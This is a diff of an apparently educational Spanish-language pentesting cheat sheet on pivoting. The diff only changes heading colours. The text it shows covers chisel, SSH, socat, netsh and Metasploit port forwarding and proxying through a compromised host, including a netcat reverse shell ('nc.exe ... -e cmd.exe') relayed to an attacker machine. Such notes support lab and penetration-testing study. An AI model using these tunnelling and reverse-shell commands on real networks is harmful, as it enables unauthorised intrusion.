@@ -12,11 +12,11 @@ toc: true
 ---
 
 
-## <span style="color:#b31d36"> Port Forwarding </span>
+## <span style="color:#208355"> Port Forwarding </span>
 
 Se crea una conexión entre un puerto local y un solo puerto en un objetivo, a través de un host comprometido. Esta técnica tiende a ser más rápida y más confiable que el proxy, pero solo nos permite acceder a un solo puerto (o un pequeño rango) en un solo dispositivo de destino. 
 
-### <span style="color:#b31d36">Chisel Port Forwarding</span>
+### <span style="color:#208355">Chisel Port Forwarding</span>
 
 **Kali Machine** - 192.168.100.118
 ```bash
@@ -34,7 +34,7 @@ chisel client 192.168.100.118:1234 R:127.0.0.1:80:10.0.0.3:80
 * R: \<local-interface\>:\<local-port\>:\<remote-host\>:\<remote-port\>
 
 
-### <span style="color:#b31d36">Metasploit Portfwd</span>
+### <span style="color:#208355">Metasploit Portfwd</span>
 
 In a meterpreter session
 
@@ -46,11 +46,11 @@ portfwd add -l 1234 -p 3389 -r 10.10.10.10
 * r: host remoto a conectarse
 ---
 
-## <span style="color:#b31d36">Proxying/Tunneling</span>
+## <span style="color:#208355">Proxying/Tunneling</span>
 
 Cuando hablamos de proxy, creamos una conexión a través de una máquina comprometida para enrutar todo el tráfico deseado a la red de destino. Un proxy es útil si deseamos redirigir mucho tráfico a nuestra red de destino, por ejemplo, un escaneo NMAP o para acceder a múltiples puertos en múltiples máquinas diferentes.
 
-### <span style="color:#b31d36">Chisel Socks Proxy</span>
+### <span style="color:#208355">Chisel Socks Proxy</span>
 
 **Kali Machine** - 192.168.100.118
 ```bash
@@ -65,7 +65,7 @@ chisel server --reverse -p 1234
 chisel client 192.168.100.118:1234 R:socks
 ```
 
-### <span style="color:#b31d36">SSH Port Dynamic Forwarding</span>
+### <span style="color:#208355">SSH Port Dynamic Forwarding</span>
 
 **Kali Machine** - 192.168.100.118
 ```bash
@@ -84,7 +84,7 @@ Port 1337
 nano /etc/proxychains.conf
 ```
 
-### <span style="color:#b31d36">SOCAT Tunneling</span>
+### <span style="color:#208355">SOCAT Tunneling</span>
 
 **Kali Machine** - 192.168.100.118
 ```bash
@@ -103,13 +103,13 @@ socat TCP-LISTEN:7777,reuseaddr,fork tcp:192.168.100.118:7878
 nc.exe 10.0.0.2 7777 -e cmd.exe
 ```
 
-### <span style="color:#b31d36">Windows Proxying</span>
+### <span style="color:#208355">Windows Proxying</span>
 
 ```bash
 netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=9999 connectaddress=10.90.60.80
 ```
 
-### <span style="color:#b31d36">Metasploit Autoroute</span>
+### <span style="color:#208355">Metasploit Autoroute</span>
 
 In a meterpreter session
 
